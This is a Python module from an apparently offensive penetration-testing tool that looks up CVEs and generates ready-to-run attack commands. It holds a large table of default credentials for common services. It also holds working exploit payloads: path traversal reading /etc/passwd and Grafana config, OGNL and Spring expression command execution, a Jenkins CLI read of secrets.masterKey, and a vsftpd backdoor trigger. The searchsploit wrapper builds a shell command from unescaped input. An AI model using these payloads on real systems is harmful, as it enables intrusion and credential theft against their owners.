"""
StrikeARC — CVE Research Module
==============================
Online CVE lookup (NVD REST API) and exploit-db wrapper for version-specific
vulnerability research. Also provides concrete exploit-command generation for
common attack vectors and a default-credentials lookup table.

All functions are enumeration-only — NO exploitation is executed.
Network failures are handled gracefully and return empty lists on error.
"""

import json
import urllib.parse
from typing import Dict, List, Optional

from utils import run_command
from state import AttackVector


# ── Default Credentials (enumeration reference only) ───────────────────
# Maps lowercased service/product names to lists of common default
# credential pairs. Used for login-form / banner credential validation.

DEFAULT_CREDS: Dict[str, List[Dict[str, str]]] = {
    "splunk": [
        {"username": "admin", "password": "changeme"},
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": "splunk"},
    ],
    "pfsense": [
        {"username": "admin", "password": "pfsense"},
        {"username": "admin", "password": "changeme"},
    ],
    "tomcat": [
        {"username": "tomcat", "password": "tomcat"},
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "s3cret"},
        {"username": "admin", "password": "tomcat"},
        {"username": "role1", "password": "role1"},
    ],
    "jenkins": [
        {"username": "admin", "password": "admin"},
        {"username": "jenkins", "password": "jenkins"},
        {"username": "admin", "password": "password"},
    ],
    "grafana": [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "grafana"},
    ],
    "gitlab": [
        {"username": "root", "password": "password"},
        {"username": "admin@example.com", "password": "password"},
        {"username": "root", "password": "5iveL!fe"},
    ],
    "elasticsearch": [
        {"username": "elastic", "password": "changeme"},
        {"username": "elastic", "password": "elastic"},
    ],
    "kibana": [
        {"username": "kibana", "password": "kibana"},
        {"username": "elastic", "password": "changeme"},
    ],
    "weblogic": [
        {"username": "weblogic", "password": "weblogic"},
        {"username": "weblogic", "password": "welcome1"},
        {"username": "weblogic", "password": "password"},
    ],
    "jboss": [
        {"username": "admin", "password": "admin"},
        {"username": "jboss", "password": "jboss"},
    ],
    "glassfish": [
        {"username": "admin", "password": "adminadmin"},
        {"username": "admin", "password": "admin"},
    ],
    "redis": [
        {"username": "", "password": ""},  # no auth configured
        {"username": "default", "password": "redis"},
    ],
    "mongodb": [
        {"username": "", "password": ""},  # no auth configured
        {"username": "admin", "password": "admin"},
        {"username": "mongo", "password": "mongo"},
    ],
    "postgres": [
        {"username": "postgres", "password": "postgres"},
        {"username": "postgres", "password": "password"},
    ],
    "mysql": [
        {"username": "root", "password": ""},
        {"username": "root", "password": "root"},
        {"username": "root", "password": "toor"},
        {"username": "root", "password": "password"},
    ],
    "mssql": [
        {"username": "sa", "password": "sa"},
        {"username": "sa", "password": "password"},
        {"username": "sa", "password": "Password123"},
    ],
    "ftp": [
        {"username": "anonymous", "password": "anonymous"},
        {"username": "ftp", "password": "ftp"},
        {"username": "admin", "password": "admin"},
    ],
    "ssh": [
        {"username": "root", "password": "root"},
        {"username": "admin", "password": "admin"},
        {"username": "pi", "password": "raspberry"},
        {"username": "ubuntu", "password": "ubuntu"},
    ],
    "smb": [
        {"username": "guest", "password": ""},
        {"username": "administrator", "password": "password"},
    ],
    "rdp": [
        {"username": "administrator", "password": "password"},
        {"username": "administrator", "password": "P@ssw0rd"},
        {"username": "admin", "password": "admin"},
    ],
    "phpmyadmin": [
        {"username": "root", "password": ""},
        {"username": "root", "password": "root"},
        {"username": "admin", "password": "admin"},
    ],
    "drupal": [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "drupal"},
        {"username": "drupaladmin", "password": "drupaladmin"},
    ],
    "wordpress": [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "wp-admin", "password": "admin"},
    ],
    "confluence": [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
    ],
    "rabbitmq": [
        {"username": "guest", "password": "guest"},
    ],
    "sonarqube": [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "sonar"},
    ],
    "nagios": [
        {"username": "nagiosadmin", "password": "nagiosadmin"},
        {"username": "nagiosadmin", "password": "password"},
    ],
    "vcenter": [
        {"username": "administrator@vsphere.local", "password": "P@ssw0rd"},
        {"username": "root", "password": "vmware"},
    ],
    "fortinet": [
        {"username": "admin", "password": ""},
        {"username": "admin", "password": "password"},
        {"username": "maintainer", "password": "admin"},
    ],
    "sonicwall": [
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": "admin"},
    ],
}


# ── NVD REST API Search ────────────────────────────────────────────────

NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"


def search_cves(service: str, version: str) -> List[Dict]:
    """
    Search the NVD REST API for CVEs matching a service + version.

    Returns a list of dicts with keys:
        id          - CVE identifier (e.g. CVE-2021-41773)
        description - first English description from NVD
        cvss_score  - float CVSS v3 base score (0.0 if unknown)
        severity    - severity label from CVSS vector (LOW/MEDIUM/HIGH/CRITICAL)
        url         - link to the NVD entry

    Returns an empty list on any network/parse failure.
    """
    if not service or not service.strip():
        return []

    keyword = f"{service} {version}".strip()
    params = urllib.parse.urlencode({"keywordSearch": keyword})
    url = f"{NVD_API_URL}?{params}"

    try:
        from utils import http_get
        response = http_get(url, timeout=30, verify_ssl=False)
        if response is None or response.status_code != 200:
            return []
        data = response.json()
    except Exception:
        return []

    cves: List[Dict] = []
    for vuln in data.get("vulnerabilities", []):
        cve_obj = vuln.get("cve", {})
        cve_id = cve_obj.get("id", "")
        if not cve_id:
            continue

        # English description
        description = ""
        for desc in cve_obj.get("descriptions", []):
            if desc.get("lang") == "en":
                description = desc.get("value", "")
                break

        # v10.4.3c: relevance gate — NVD keywordSearch matches LOOSELY
        # ("openssh 8.2" matches any CVE whose text contains "8.2", e.g. the
        # Baxter infusion-pump CVE-2020-12062). Require the service name
        # itself to appear in the description, else the CVE is noise.
        svc_word = (service or "").lower().strip()
        if svc_word and svc_word not in description.lower():
            continue

        # CVSS v3 metrics (prefer v3.1, then v3.0)
        metrics = cve_obj.get("metrics", {})
        cvss_data = metrics.get("cvssMetricV31") or metrics.get("cvssMetricV30") or []
        cvss_score = 0.0
        severity = "UNKNOWN"

        if cvss_data:
            first = cvss_data[0]
            cvss_detail = first.get("cvssData", {})
            cvss_score = float(cvss_detail.get("baseScore", 0.0))
            # Prefer the metric's own severity label; fall back to vector
            severity = (first.get("baseSeverity")
                        or cvss_detail.get("baseSeverity")
                        or "UNKNOWN").upper()

        cves.append({
            "id": cve_id,
            "description": description,
            "cvss_score": cvss_score,
            "severity": severity,
            "url": f"https://nvd.nist.gov/vuln/detail/{cve_id}",
        })

    return cves


# ── ExploitDB Wrapper (local searchsploit) ─────────────────────────────

def search_exploitdb_online(query: str) -> List[Dict]:
    """
    Search the local ExploitDB database via `searchsploit --json`.

    Wraps the existing searchsploit binary (if installed) and returns a list
    of dicts with keys: title, type, path, platform.
    Returns an empty list if searchsploit is unavailable or the query fails.
    """
    if not query or not query.strip():
        return []

    cmd = f"searchsploit --json '{query}' 2>/dev/null"
    result = run_command(cmd, timeout=30)

    if not result.get("stdout"):
        return []

    try:
        data = json.loads(result["stdout"])
    except (json.JSONDecodeError, ValueError):
        return []

    exploits = []
    for entry in data.get("RESULTS_EXPLOIT", [])[:15]:
        exploits.append({
            "title": entry.get("Title", ""),
            "type": entry.get("Type", ""),
            "path": entry.get("Path", ""),
            "platform": entry.get("Platform", ""),
        })

    return exploits


# ── Exploit Command Generation ─────────────────────────────────────────

def _fmt_target(target: str) -> str:
    """Return the target as-is (expected to be host:port or URL)."""
    return target


def generate_exploit_commands(vector: AttackVector) -> List[str]:
    """
    Given an AttackVector, return concrete, copy-pasteable enumeration /
    validation commands tailored to the vector's CVE(s) and type.

    These are SUGGESTED commands for an operator to run manually — this
    function does NOT execute anything. All commands are enumeration or
    safe-validation focused where possible.

    Returns an empty list if no matching template is found.
    """
    target = _fmt_target(vector.get("target", ""))
    cves = " ".join(vector.get("cves", []) or []).upper()
    vtype = vector.get("vector_type", "").lower()
    title = vector.get("title", "").lower()
    suggestions = list(vector.get("exploit_suggestions", []) or [])

    commands: List[str] = []

    # ── Splunk RCE / Splunk ───────────────────────────────────────────
    if "splunk" in title or "splunk" in cves.lower():
        commands.extend([
            f"# Splunk enumeration / RCE validation against {target}",
            f"curl -sk https://{target}/services/server/info | head",
            f"curl -sk https://{target}/services/server/roles",
            "# If auth bypass works (CVE-2023-46214 / S2-062):",
            f"curl -sk -X POST https://{target}/en-US/splunkd/__raw/services/search/jobs/export "
            f"-d 'search=| rest /services/server/info' -o splunk_out.txt",
        ])

    # ── pfSense ───────────────────────────────────────────────────────
    elif "pfsense" in title or "pfsense" in vtype or "pfsense" in cves.lower():
        commands.extend([
            f"# pfSense enumeration against {target}",
            f"curl -sk https://{target}/ | grep -i 'pfsense\\|version'",
            "# XML-RPC interface (CVE-2023-27287 / auth bypass):",
            f"curl -sk -X POST https://{target}/xmlrpc.php "
            f"-H 'Content-Type: text/xml' "
            f"-d '<?xml version=\"1.0\"?><methodCall><methodName>pfsense.interfaces_configuration</methodName>"
            f"<params><param><value>test</value></param></params></methodCall>'",
        ])

    # ── OpenSSH user enumeration (CVE-2018-15473) ────────────────────
    elif "CVE-2018-15473" in cves or "ssh" in vtype and "enum" in title:
        commands.extend([
            f"# OpenSSH username enumeration (CVE-2018-15473) against {target}",
            f"python3 /usr/share/exploitdb/exploits/linux/remote/45233.py {target.split(':')[0]} "
            f"--port {target.split(':')[1] if ':' in target else 22} --userlist /usr/share/wordlists/metasploit/unix_users.txt",
            "# Alternative Metasploit auxiliary:",
            "# msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; "
            f"set RHOSTS {target.split(':')[0]}; run; exit'",
        ])

    # ── Apache path traversal (CVE-2021-41773 / 42013) ───────────────
    elif "CVE-2021-41773" in cves or "CVE-2021-42013" in cves:
        commands.extend([
            f"# Apache path traversal validation against {target}",
            f"curl -sk --path-as-is '{target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
            f"curl -sk --path-as-is '{target}/cgi-bin/%%32%65/%%32%65/%%32%65/%%32%65/etc/passwd'",
        ])

    # ── vsftpd backdoor (CVE-2011-2523) ──────────────────────────────
    elif "CVE-2011-2523" in cves or "vsftpd" in title:
        commands.extend([
            f"# vsftpd 2.3.4 backdoor check against {target}",
            f"nc {target.replace(':', ' ')}",
            "# Enter username 'user:) ' to trigger — if backdoor active, port 6200 opens:",
            f"nc {target.split(':')[0]} 6200",
        ])

    # ── Spring4Shell / Spring Cloud Function ─────────────────────────
    elif "CVE-2022-22965" in cves or "CVE-2022-22963" in cves or "spring" in title:
        commands.extend([
            f"# Spring4Shell / Spring Cloud Function validation against {target}",
            f"curl -sk -X POST '{target}/functionRouter' "
            f"-H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")' "
            f"-H 'Content-Type: application/x-www-form-urlencoded' -d 'test=1'",
        ])

    # ── Jenkins arbitrary file read (CVE-2024-23897) ─────────────────
    elif "CVE-2024-23897" in cves or "jenkins" in title:
        commands.extend([
            f"# Jenkins CLI arbitrary file read (CVE-2024-23897) against {target}",
            f"wget -q {target}/jnlpJars/jenkins-cli.jar -O /tmp/jenkins-cli.jar",
            f"java -jar /tmp/jenkins-cli.jar -s {target} help '@/etc/passwd'",
            f"java -jar /tmp/jenkins-cli.jar -s {target} help '@/var/lib/jenkins/secrets.masterKey'",
        ])

    # ── Confluence RCE (CVE-2023-22515) ──────────────────────────────
    elif "CVE-2023-22515" in cves or "confluence" in title:
        commands.extend([
            f"# Confluence RCE check (CVE-2023-22515) against {target}",
            f"curl -sk '{target}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false'",
            f"curl -sk '{target}/setup/setupadministrator.action'",
        ])

    # ── Apache Struts (CVE-2017-5638) ────────────────────────────────
    elif "CVE-2017-5638" in cves or "struts" in title:
        commands.extend([
            f"# Struts2 RCE validation (S2-045) against {target}",
            f"curl -sk -H 'Content-Type: %{{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            f"(@java.lang.Runtime@getRuntime().exec(\"id\"))}}' {target}",
        ])

    # ── Grafana path traversal (CVE-2021-43798) ──────────────────────
    elif "CVE-2021-43798" in cves or "grafana" in title:
        commands.extend([
            f"# Grafana arbitrary file read (CVE-2021-43798) against {target}",
            f"curl -sk --path-as-is '{target}/public/plugins/alertlist/../../../../../../../etc/passwd'",
            f"curl -sk --path-as-is '{target}/public/plugins/alertlist/../../../../../../../etc/grafana/grafana.ini'",
        ])

    # ── Default credentials ──────────────────────────────────────────
    elif vtype in ("default_creds", "weak_creds", "auth_bypass"):
        service_guess = ""
        for svc in DEFAULT_CREDS:
            if svc in title or svc in vector.get("description", "").lower():
                service_guess = svc
                break
        if service_guess:
            commands.append(f"# Validate default credentials for {service_guess} on {target}")
            for cred in DEFAULT_CREDS[service_guess][:5]:
                u = cred["username"]
                p = cred["password"]
                commands.append(f"curl -sk -u '{u}:{p}' {target}/  # {u}:{p}")

    # ── PowerDNS / PowerGSLB ────────────────────────────────────────
    elif "powerdns" in title or "powergslb" in title:
        commands.extend([
            f"# PowerDNS enumeration against {target}",
            f"dig version.bind CHAOS TXT @{target.split(':')[0]}",
            f"dig axfr @{target.split(':')[0]}",
            "# PowerDNS default admin panel (port 8081):",
            f"curl -sk -u 'admin:admin' http://{target.split(':')[0]}:8081/servers",
            "# CVE-2020-10030 (PowerDNS auth bypass < 4.3.0):",
            f"curl -sk http://{target.split(':')[0]}:8081/servers/localhost/config",
        ])

    # ── Radicale / CalDAV ───────────────────────────────────────────
    elif "radicale" in title or "caldav" in title or "caldav" in vtype:
        commands.extend([
            f"# Radicale/CalDAV enumeration against {target}",
            f"curl -sk -X OPTIONS {target}/ -D -",
            f"curl -sk -X PROPFIND {target}/ -H 'Depth: 0' "
            f"-H 'Content-Type: application/xml' "
            f"-d '<?xml version=\"1.0\"?><d:propfind xmlns:d=\"DAV:\"><d:prop><d:current-user-principal/></d:prop></d:propfind>'",
            "# List calendars/contacts (unauthenticated):",
            f"curl -sk -X PROPFIND {target}/ -H 'Depth: 1' "
            f"-H 'Content-Type: application/xml' "
            f"-d '<?xml version=\"1.0\"?><d:propfind xmlns:d=\"DAV:\"><d:prop><d:resourcetype/></d:prop></d:propfind>'",
            "# CVE-2019-17266 (Radicale auth bypass < 2.1.2):",
            f"curl -sk {target}/root/",
            f"curl -sk -u 'admin:admin' {target}/root/",
        ])

    # ── Fallback: return the vector's own exploit_suggestions ────────
    if not commands and suggestions:
        return suggestions

    return commands
